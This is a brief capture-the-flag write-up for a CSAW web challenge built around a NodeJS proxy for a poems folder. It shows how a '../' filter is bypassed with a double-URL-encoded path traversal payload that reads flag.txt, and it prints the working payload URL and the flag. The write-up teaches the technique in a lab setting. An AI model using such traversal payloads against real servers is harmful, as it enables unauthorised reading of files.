# Challenge

I wrote a little proxy program in NodeJS for my poems folder.

Everyone wants to read flag.txt but I like it too much to share.

http://web.chal.csaw.io:7311/?path=orange.txt

# Walkthrough/Solution

The url given hinted towards the direction of a local file inclusion attack. Visiting `http://web.chal.csaw.io:7311/?path=` gives us the directory listing as follows:

```
Directory listing for /poems/

burger.txt
haiku.txt
orange.txt
ppp.txt
the_red_wheelbarrow.txt
```
When I try to include the file `flag.txt` by performing a series of `../` sequences, I got this alert from the server `WHOA THATS BANNED!!!!`.

The server didn't filter for double encoding, so this payload works `http://web.chal.csaw.io:7311/?path=%252E%252E%2Fflag.txt`.

And so the flag is `flag{thank_you_based_orange_for_this_ctf_challenge}`.

# Learning outcome
1. URL double encode
